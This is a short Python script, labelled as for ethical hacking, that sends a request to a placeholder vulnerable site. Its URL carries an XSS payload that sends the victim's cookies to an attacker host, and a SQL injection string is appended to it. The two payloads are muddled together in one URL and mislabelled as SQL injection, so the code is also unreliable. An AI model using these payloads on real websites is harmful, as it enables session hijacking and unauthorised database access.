#  ---------------------------------------------------------------------------------------------------------------------
#  ---------------------------------------------------------------------------------------------------------------------
#  -------------------------- for educational purposes and ethical hacking only ----------------------------------------
#  ---------------------------------------------------------------------------------------------------------------------
#  ---------------------------------------------------------------------------------------------------------------------
import requests
# The URL of the vulnerable website & attacker
url = "http://vulnerable-website.tld/login?username=<script>document.location='http://attacker.tld/log?cookie='+document.cookie;</script>"
# example payload to inject SQL code, set to your needs
payload = "' OR 'a'='a';--"
# The final URL with the injected SQL code
url_with_injected_sql = url + payload
# Send the malicious request
# e.g
response = requests.get(url_with_injected_sql)
# some other stuff!
# Print the response
print(response.text)
# end if ;)
